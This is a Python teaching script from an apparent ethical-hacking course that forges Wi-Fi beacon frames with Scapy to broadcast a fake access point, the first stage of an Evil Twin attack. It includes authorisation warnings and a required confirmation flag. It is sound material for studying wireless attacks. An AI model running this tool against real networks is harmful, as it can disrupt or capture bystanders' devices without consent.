#!/usr/bin/env python3
"""
04_attacks/01_fake_ap.py — Announce a fake access point (beacon flood / fake AP).

⚠  THIS IS AN ACTIVE TOOL. It transmits beacon frames.
   Broadcasting a fake SSID can confuse, disrupt or capture nearby clients.
   Use ONLY on networks and in environments you own or are authorized to test.
   In Portugal: Lei 109/2009 — unauthorized interference is a criminal offense.
   One signed authorization letter is the line between a pentest and a crime.

The minimal, slide-sized fake-AP demo. We forge a beacon frame — the same
"I'm here, my name is X" broadcast every real AP sends — and transmit it on a
loop. To a phone scanning the air, our invented network looks just as real as
the coffee shop's. This is the transmit half of the Evil Twin: combine it with
the PNL from 2.2 and the deauth in 2.4 and you understand the whole attack.

For the full Evil Twin config generator (hostapd + dnsmasq), see 04_attacks/05_evil_twin.py.

Usage:
    sudo python3 04_attacks/01_fake_ap.py --iface wlan1mon --i-have-authorization
    sudo python3 04_attacks/01_fake_ap.py --iface wlan1mon --ssid Lab-EvilTwin \\
        --channel 6 --i-have-authorization

Requires: pip install scapy

CYBERS3C — Ethical Hacking Postgrad — Wi-Fi Module — Session 2
"""

import argparse
import sys

try:
    from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
except ImportError:
    print("[!] Scapy missing. pip install scapy")
    sys.exit(1)

# --- make wifi_utils (repo root) importable from any topic subfolder ---
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from wifi_utils import require_root, require_monitor_mode, add_iface_arg

# Locally administered MAC (bit 1 of the first octet set) — not a real vendor.
FAKE_BSSID = "02:11:22:33:44:55"


def main():
    parser = argparse.ArgumentParser(
        description="Announce a fake AP by transmitting forged beacon frames.",
    )
    add_iface_arg(parser)
    parser.add_argument("--ssid", default="Lab-EvilTwin",
                        help="SSID to advertise. (default: Lab-EvilTwin)")
    parser.add_argument("--channel", type=int, default=6, metavar="N",
                        help="Channel to advertise in the beacon. (default: 6)")
    parser.add_argument("--bssid", default=FAKE_BSSID,
                        help=f"BSSID to advertise. (default: {FAKE_BSSID})")
    parser.add_argument("--i-have-authorization", action="store_true",
                        help="Required. Confirms you are authorized to transmit.")
    args = parser.parse_args()

    if not args.i_have_authorization:
        print("[!] This tool transmits. Pass --i-have-authorization to confirm")
        print("    you own or are authorized to test this environment.")
        sys.exit(1)

    require_root("04_attacks/01_fake_ap.py")
    require_monitor_mode(args.iface)

    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                  addr2=args.bssid, addr3=args.bssid)
    frame = (RadioTap()
             / dot11
             / Dot11Beacon(cap="ESS")
             / Dot11Elt(ID="SSID", info=args.ssid)
             / Dot11Elt(ID="DSset", info=chr(args.channel)))

    print(f"\n=== 2.3 Fake AP | iface={args.iface} ===")
    print(f"[*] Advertising SSID '{args.ssid}' as {args.bssid} on channel {args.channel}.")
    print("[*] Transmitting beacons ~10x/sec. Ctrl-C to stop.\n")

    try:
        sendp(frame, iface=args.iface, inter=0.1, loop=1)
    except KeyboardInterrupt:
        print("\n[+] Stopped. The fake AP is off the air.")


if __name__ == "__main__":
    main()
